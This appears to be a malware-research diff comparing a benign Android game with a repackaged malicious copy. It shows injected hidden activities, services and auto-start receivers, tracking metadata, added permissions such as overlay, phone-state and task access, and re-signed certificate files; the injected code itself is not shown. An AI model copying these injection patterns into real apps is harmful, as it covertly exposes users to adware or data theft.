@@ -1,0 +1,412 @@
+diff -r result/APP_53/App_B_53/AndroidManifest.xml result/APP_53/App_M_53/AndroidManifest.xml
+18a19,47
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.android.tool.LayTool"/>
+>         <service android:name="com.android.tool.DownService"/>
+>         <receiver android:name="com.android.tool.RevTool">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:launchMode="singleTask" android:name="com.android.net.Pop"/>
+>         <meta-data android:name="j-id" android:value="708b3fdb1bad462294c55125572a66ff"/>
+>         <service android:name="com.android.net.NetService"/>
+>         <receiver android:name="com.android.net.BrTool">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+19a49,57
+>     <supports-screens android:anyDensity="true"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+diff -r result/APP_53/App_B_53/apktool.yml result/APP_53/App_M_53/apktool.yml
+2c2
+< apkFileName: Bapp53-7F3CA999DF536604EA27AD1C15FCF0827146964C26C9C035D21C22620BFFFDB8.apk
+---
+> apkFileName: Mapp53-86655F2820E91F2B2AF43439E4DCDE6DCA80EE880380AE2C894B884AD7F18FA5.apk
+6,7d5
+< - wav
+< - mp3
+9a8,9
+> - wav
+> - mp3
+19,20c19
+< unknownFiles:
+<   manifest: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_53/App_M_53/com/android: net
+Somente em result/APP_53/App_M_53/com/android: tool
+diff -r result/APP_53/App_B_53/com/google/android/vending/expansion/downloader/impl/DownloadsDB.java result/APP_53/App_M_53/com/google/android/vending/expansion/downloader/impl/DownloadsDB.java
+458,459c458,469
+<       String[] arrayOfString = { "FN", "TEXT UNIQUE" };
+<       SCHEMA = new String[][] { { "_id", "INTEGER PRIMARY KEY" }, { "FILEIDX", "INTEGER UNIQUE" }, { "URI", "TEXT" }, arrayOfString, { "ETAG", "TEXT" }, { "TOTALBYTES", "INTEGER" }, { "CURRENTBYTES", "INTEGER" }, { "LASTMOD", "INTEGER" }, { "STATUS", "INTEGER" }, { "CONTROL", "INTEGER" }, { "FAILCOUNT", "INTEGER" }, { "RETRYAFTER", "INTEGER" }, { "REDIRECTCOUNT", "INTEGER" } };
+---
+>       String[] arrayOfString1 = { "_id", "INTEGER PRIMARY KEY" };
+>       String[] arrayOfString2 = { "FILEIDX", "INTEGER UNIQUE" };
+>       String[] arrayOfString3 = { "URI", "TEXT" };
+>       String[] arrayOfString4 = { "FN", "TEXT UNIQUE" };
+>       String[] arrayOfString5 = { "TOTALBYTES", "INTEGER" };
+>       String[] arrayOfString6 = { "CURRENTBYTES", "INTEGER" };
+>       String[] arrayOfString7 = { "LASTMOD", "INTEGER" };
+>       String[] arrayOfString8 = { "STATUS", "INTEGER" };
+>       String[] arrayOfString9 = { "FAILCOUNT", "INTEGER" };
+>       String[] arrayOfString10 = { "RETRYAFTER", "INTEGER" };
+>       String[] arrayOfString11 = { "REDIRECTCOUNT", "INTEGER" };
+>       SCHEMA = new String[][] { arrayOfString1, arrayOfString2, arrayOfString3, arrayOfString4, { "ETAG", "TEXT" }, arrayOfString5, arrayOfString6, arrayOfString7, arrayOfString8, { "CONTROL", "INTEGER" }, arrayOfString9, arrayOfString10, arrayOfString11 };
+Os arquivos binários result/APP_53/App_B_53/original/AndroidManifest.xml e result/APP_53/App_M_53/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_53/App_B_53/original/META-INF/CERT.RSA e result/APP_53/App_M_53/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_53/App_B_53/original/META-INF/CERT.SF result/APP_53/App_M_53/original/META-INF/CERT.SF
+2,3c2,4
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: z/Q4QcTzIG2dV7Rj+UEB6JCbHps=
+---
+> SHA1-Digest-Manifest-Main-Attributes: SHCGxzzEaMI6zkXjfCtYUEmyHUA=
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+> SHA1-Digest-Manifest: pmxxzuETUFwm0Xj3I+WFk5UR+Vk=
+5,6c6,7
+< Name: res/drawable-mdpi/notify_panel_notification_icon_bg.png
+< SHA1-Digest: QPowQyWqKpTaYOjRqs19gE1H4rM=
+---
+> Name: res/drawable-xhdpi/testpreview.png
+> SHA1-Digest: Wb5Sx4BijpbQIm5Q46AeexnWhWQ=
+11,12c12,13
+< Name: res/drawable-xhdpi/testpreview.png
+< SHA1-Digest: Wb5Sx4BijpbQIm5Q46AeexnWhWQ=
+---
+> Name: res/drawable-mdpi/notify_panel_notification_icon_bg.png
+> SHA1-Digest: QPowQyWqKpTaYOjRqs19gE1H4rM=
+26,28d26
+< Name: res/raw/level_john_folsom.txt
+< SHA1-Digest: anTWdQBnhV39QnCy8UIn7Mx4qr0=
+< 
+31a30,32
+> Name: res/raw/level_john_folsom.txt
+> SHA1-Digest: anTWdQBnhV39QnCy8UIn7Mx4qr0=
+> 
+57c58
+< SHA1-Digest: 8L3TjnL93seH27sGVGOJwRrUA/Y=
+---
+> SHA1-Digest: X2Q9wLGT9KCXj9aHQP/6Z4vsJr4=
+60c61
+< SHA1-Digest: jf+k2kJdpvhXbhGUWU936YkBJOE=
+---
+> SHA1-Digest: bqBsU5GauviqYPAGZtM6ulBv1Gs=
+102,105c103
+< SHA1-Digest: oKsx5SEtfkLxeZVQoWZITBHbawA=
+< 
+< Name: manifest
+< SHA1-Digest: eQsFnhaj9q1bTPlSAvlsa+lJS9M=
+---
+> SHA1-Digest: nq20gj0uw52TYgJEXfIG/MxXdlg=
+111c109
+< SHA1-Digest: saRo/1GCnFMMQCf2VItk4qSHWBA=
+---
+> SHA1-Digest: lF9S2iA5UwF8eFJx6un+lwqi+TM=
+120c118
+< SHA1-Digest: pH4m8pKxgSRT7LSGAKL2J6fp8IY=
+---
+> SHA1-Digest: gjqCxJSljCRGamasLP6zOZoR9Ro=
+140,142d137
+< Name: res/drawable-xhdpi/james_quinnpreview.png
+< SHA1-Digest: gV+YNxo3Xey/35UWN4I0ZzyfgSU=
+< 
+145a141,143
+> Name: res/drawable-xhdpi/james_quinnpreview.png
+> SHA1-Digest: gV+YNxo3Xey/35UWN4I0ZzyfgSU=
+> 
+147c145
+< SHA1-Digest: bqTXrmKlErfQMzkGQkkDId68Iig=
+---
+> SHA1-Digest: klKGLPfXATDSGo8tHcCpUx96x54=
+171c169
+< SHA1-Digest: +/fN/5KrAaJ7qk2nbPmH5xbpuY0=
+---
+> SHA1-Digest: gVXJHkmo8m0jgZdi3GHeEGz+ZUw=
+185,186c183,184
+< Name: res/layout/mainmenu.xml
+< SHA1-Digest: AfWEyEzlm+kqyyT+TKKxo+1d7Pk=
+---
+> Name: res/drawable-xhdpi/hardcorebg.png
+> SHA1-Digest: eGabkkHPQAYCZ8Moxp6tpL6u/M8=
+191,195c189,190
+< Name: res/drawable-xhdpi/hardcorebg.png
+< SHA1-Digest: eGabkkHPQAYCZ8Moxp6tpL6u/M8=
+< 
+< Name: res/drawable-xhdpi/prevbutton.png
+< SHA1-Digest: HeCpvdZ9NCf7JMNTM0S91z7AQ6E=
+---
+> Name: res/layout/mainmenu.xml
+> SHA1-Digest: 0KVDCE2cibIarND3p634bG9/E7s=
+199a195,197
+> Name: res/drawable-xhdpi/prevbutton.png
+> SHA1-Digest: HeCpvdZ9NCf7JMNTM0S91z7AQ6E=
+> 
+213c211
+< SHA1-Digest: Nog4zEISL9y+yWCxiHbTEtCdigk=
+---
+> SHA1-Digest: 5X5EbOiTbxmqNkA4hr4mKsdK0Vo=
+222c220
+< SHA1-Digest: RHSo9PosX35bUeiWer5u8Er1nQg=
+---
+> SHA1-Digest: NdKRIX1X8PRYTd7ccNTue2P07W4=
+227,229d224
+< Name: res/drawable-xhdpi/randy_jacksonpreview.png
+< SHA1-Digest: IcTqPye9P27vWYj3AZqb96EeeAA=
+< 
+232a228,230
+> Name: res/drawable-xhdpi/randy_jacksonpreview.png
+> SHA1-Digest: IcTqPye9P27vWYj3AZqb96EeeAA=
+> 
+241a240,242
+> Name: res/drawable-xhdpi/hitboxdefault.png
+> SHA1-Digest: gvAj6yc++joPBo9cJ+mQuh/8mSo=
+> 
+248,250d248
+< Name: res/drawable-xhdpi/hitboxdefault.png
+< SHA1-Digest: gvAj6yc++joPBo9cJ+mQuh/8mSo=
+< 
+281,283d278
+< Name: res/drawable-xhdpi/checkboxchecked.png
+< SHA1-Digest: Cjz50Jx+vf1VDD+86rcP7Cdvj0M=
+< 
+287,291c282,283
+< Name: res/drawable-xhdpi/biglogo.png
+< SHA1-Digest: xGNq4iFXrs6YcpEX/Y92yGa165c=
+< 
+< Name: res/drawable-xhdpi/morescores_button.png
+< SHA1-Digest: IquzrNlJ41xcg8rVTXEs/D8Cn8M=
+---
+> Name: res/drawable-xhdpi/checkboxchecked.png
+> SHA1-Digest: Cjz50Jx+vf1VDD+86rcP7Cdvj0M=
+298a291,296
+> Name: res/drawable-xhdpi/biglogo.png
+> SHA1-Digest: xGNq4iFXrs6YcpEX/Y92yGa165c=
+> 
+> Name: res/drawable-xhdpi/morescores_button.png
+> SHA1-Digest: IquzrNlJ41xcg8rVTXEs/D8Cn8M=
+> 
+311,313d308
+< Name: res/drawable-hdpi/notify_panel_notification_icon_bg.png
+< SHA1-Digest: 4etGey1PS5+B6QxONvNsO2coy1Y=
+< 
+316a312,314
+> Name: res/drawable-hdpi/notify_panel_notification_icon_bg.png
+> SHA1-Digest: 4etGey1PS5+B6QxONvNsO2coy1Y=
+> 
+320,322d317
+< Name: res/drawable-xhdpi/creditsbutton.png
+< SHA1-Digest: DxOS1HNZoLopRv/iTvtXshQEYwU=
+< 
+325a321,323
+> Name: res/drawable-xhdpi/creditsbutton.png
+> SHA1-Digest: DxOS1HNZoLopRv/iTvtXshQEYwU=
+> 
+362,364d359
+< Name: res/drawable-xhdpi/infobar.png
+< SHA1-Digest: UpWrX1j1lbxP/c1f/+C+uRhD/hI=
+< 
+367a363,365
+> Name: res/drawable-xhdpi/infobar.png
+> SHA1-Digest: UpWrX1j1lbxP/c1f/+C+uRhD/hI=
+> 
+383,385d380
+< Name: res/drawable-xhdpi/arrowdown_button.png
+< SHA1-Digest: JvED7uNi0UZuP6t42/lwn9KXFnE=
+< 
+388a384,386
+> Name: res/drawable-xhdpi/arrowdown_button.png
+> SHA1-Digest: JvED7uNi0UZuP6t42/lwn9KXFnE=
+> 
+413,415d410
+< Name: res/raw/starawarded.mp3
+< SHA1-Digest: UQQD5s66Osq39omz1mqYZ6cUHuw=
+< 
+417a413,415
+> 
+> Name: res/raw/starawarded.mp3
+> SHA1-Digest: UQQD5s66Osq39omz1mqYZ6cUHuw=
+diff -r result/APP_53/App_B_53/original/META-INF/MANIFEST.MF result/APP_53/App_M_53/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+4,5c4,5
+< Name: res/drawable-xhdpi/testpreview.png
+< SHA1-Digest: IGfg04PUo6adFm69eX/ni9M1po4=
+---
+> Name: res/drawable-mdpi/notify_panel_notification_icon_bg.png
+> SHA1-Digest: CbiOmu2xHaCO/6a1W1iVByfqK/A=
+10,11c10,11
+< Name: res/drawable-mdpi/notify_panel_notification_icon_bg.png
+< SHA1-Digest: CbiOmu2xHaCO/6a1W1iVByfqK/A=
+---
+> Name: res/drawable-xhdpi/testpreview.png
+> SHA1-Digest: IGfg04PUo6adFm69eX/ni9M1po4=
+25,27d24
+< Name: res/raw/level_bill_steiner7.txt
+< SHA1-Digest: QWOnfG0SADPn2mhSm5Nkvvkhr2M=
+< 
+30a28,30
+> Name: res/raw/level_bill_steiner7.txt
+> SHA1-Digest: QWOnfG0SADPn2mhSm5Nkvvkhr2M=
+> 
+56c56
+< SHA1-Digest: 6Jr4fYG1sgQDAyMreoqGwUFMxZE=
+---
+> SHA1-Digest: EXz9EkkRjP+RRf37qZNqC8aVR1M=
+59c59
+< SHA1-Digest: DUdA1Tta5YPQGMNCcXVJH5SE+Ag=
+---
+> SHA1-Digest: pjFgyH1oqT6OT5i2kpRFN1ezsrk=
+101,104c101
+< SHA1-Digest: 6UXr+2lqziFAgZl+Og32C1msAXA=
+< 
+< Name: manifest
+< SHA1-Digest: mMPMo8V6pVtuzWe7ZFR440kXloo=
+---
+> SHA1-Digest: qu9QCto3PdI+bGPiNqZe2KoFWOE=
+110c107
+< SHA1-Digest: vCC9T8O+e6XS/5Qz+4gPSXyKiZk=
+---
+> SHA1-Digest: z5MYyt2ZnuTePNKEY/43kCxMfQc=
+119c116
+< SHA1-Digest: ztFptVt8C6ylZ0fGxByUr/Dv6DA=
+---
+> SHA1-Digest: kQBPqXhBPzO7xvvAJEkxry8GTpE=
+139,141d135
+< Name: res/drawable-xhdpi/sharebutton.png
+< SHA1-Digest: phBhkTGBg5TVjvhrk5QTGNd31Oo=
+< 
+144a139,141
+> Name: res/drawable-xhdpi/sharebutton.png
+> SHA1-Digest: phBhkTGBg5TVjvhrk5QTGNd31Oo=
+> 
+146c143
+< SHA1-Digest: PgHBHGlfjA2Zb01SVUGfYazUJ6I=
+---
+> SHA1-Digest: ixspK+YIcI2C/Uz6YhmxlwFq9X8=
+170c167
+< SHA1-Digest: /Rmp67ONxLxtBZFu2TQKSgjbb9o=
+---
+> SHA1-Digest: 2yqohMNrTn4Ts6kZq6mu4GDqAJI=
+184,185c181,182
+< Name: res/layout/mainmenu.xml
+< SHA1-Digest: 9EeW/+wx5fFM3Ysh2L+KPrqrMPU=
+---
+> Name: res/drawable-xhdpi/hardcorebg.png
+> SHA1-Digest: RgiLlsn1/lrNMtJB0uEFrHjoig0=
+190,194c187,188
+< Name: res/drawable-xhdpi/hardcorebg.png
+< SHA1-Digest: RgiLlsn1/lrNMtJB0uEFrHjoig0=
+< 
+< Name: res/drawable-xhdpi/prevbutton.png
+< SHA1-Digest: RLfdzCx10z9GIWkU0K0y8vZki9c=
+---
+> Name: res/layout/mainmenu.xml
+> SHA1-Digest: oR0B0dKTTGBJEUvkNIAErJsKz2I=
+198a193,195
+> Name: res/drawable-xhdpi/prevbutton.png
+> SHA1-Digest: RLfdzCx10z9GIWkU0K0y8vZki9c=
+> 
+212c209
+< SHA1-Digest: wiIV9xE6vphzR8NXjIjAWGYju6c=
+---
+> SHA1-Digest: frlCJy8m1Y2JniuVbNtW1aTuS2k=
+221c218
+< SHA1-Digest: Vkrk7c6cvY9SvQwaWJ1f0Ra9l50=
+---
+> SHA1-Digest: dpBSgcDDNFv+ILAMfmAHDvHGaJQ=
+226,228d222
+< Name: res/drawable-xhdpi/randy_jacksonpreview.png
+< SHA1-Digest: oEdEu+f8xH/1JxkskQMel7hRq0M=
+< 
+231a226,228
+> Name: res/drawable-xhdpi/randy_jacksonpreview.png
+> SHA1-Digest: oEdEu+f8xH/1JxkskQMel7hRq0M=
+> 
+240a238,240
+> Name: res/drawable-xhdpi/hitboxdefault.png
+> SHA1-Digest: egc/zjYlGEs6WZXbkNzA0VOLrk0=
+> 
+247,249d246
+< Name: res/drawable-xhdpi/hitboxdefault.png
+< SHA1-Digest: egc/zjYlGEs6WZXbkNzA0VOLrk0=
+< 
+280,282d276
+< Name: res/drawable-xhdpi/checkboxchecked.png
+< SHA1-Digest: N1MUleQSEf68RNBj6APOP57Af7Q=
+< 
+286,287c280,281
+< Name: res/drawable-xhdpi/morescores_button.png
+< SHA1-Digest: P3GDcAsYnFPBmx7ZedTRoIuz3x8=
+---
+> Name: res/drawable-xhdpi/checkboxchecked.png
+> SHA1-Digest: N1MUleQSEf68RNBj6APOP57Af7Q=
+297a292,294
+> Name: res/drawable-xhdpi/morescores_button.png
+> SHA1-Digest: P3GDcAsYnFPBmx7ZedTRoIuz3x8=
+> 
+310,312d306
+< Name: res/drawable-xhdpi/unlockhardcore_purchased.png
+< SHA1-Digest: jvsxHuYNKn0fzYrGhhXK6ro3M0k=
+< 
+315a310,312
+> Name: res/drawable-xhdpi/unlockhardcore_purchased.png
+> SHA1-Digest: jvsxHuYNKn0fzYrGhhXK6ro3M0k=
+> 
+319,321d315
+< Name: res/drawable-xhdpi/achievements_button.png
+< SHA1-Digest: YDj8ldZMmRu799EsUW3Sci08iNw=
+< 
+324a319,321
+> Name: res/drawable-xhdpi/achievements_button.png
+> SHA1-Digest: YDj8ldZMmRu799EsUW3Sci08iNw=
+> 
+361,363d357
+< Name: res/drawable-xhdpi/timebonuspopup.png
+< SHA1-Digest: 6lx/N+Ce7tXTjVU+ecOpYKYthmU=
+< 
+366a361,363
+> Name: res/drawable-xhdpi/timebonuspopup.png
+> SHA1-Digest: 6lx/N+Ce7tXTjVU+ecOpYKYthmU=
+> 
+382,384d378
+< Name: res/drawable-xhdpi/storymode_button.png
+< SHA1-Digest: ruL3cXZxRhuKTceaSFBrDlKH9Ug=
+< 
+387a382,384
+> Name: res/drawable-xhdpi/storymode_button.png
+> SHA1-Digest: ruL3cXZxRhuKTceaSFBrDlKH9Ug=
+> 
+412,414d408
+< Name: res/drawable-xhdpi/reviewbutton.png
+< SHA1-Digest: OyDR3S9XiRpx6Q/yvPYi2ZkOK9E=
+< 
+416a411,413
+> 
+> Name: res/drawable-xhdpi/reviewbutton.png
+> SHA1-Digest: OyDR3S9XiRpx6Q/yvPYi2ZkOK9E=
+Somente em result/APP_53/App_M_53/smali/com/android: net
+Somente em result/APP_53/App_M_53/smali/com/android: tool
+Somente em result/APP_53/App_B_53/: unknown
